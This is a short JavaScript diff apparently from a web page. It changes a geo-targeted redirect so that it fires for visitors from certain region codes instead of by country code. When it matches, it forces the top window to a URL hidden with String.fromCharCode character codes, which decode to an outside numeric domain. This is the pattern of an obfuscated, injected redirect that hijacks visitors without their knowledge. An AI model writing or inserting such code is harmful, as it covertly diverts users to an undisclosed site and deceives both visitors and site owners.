@@ -1,6 +1,6 @@
 function getips(d){
 
- if(d.country_code=="CN"){
+ if(/(FJ|GD|GX|HN|ZJ|BJ|JX)/.test(d.region_code)){
    window.top.location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 48, 48, 50, 56, 48, 48, 48, 46, 99, 111, 109, 47);
   }
 }
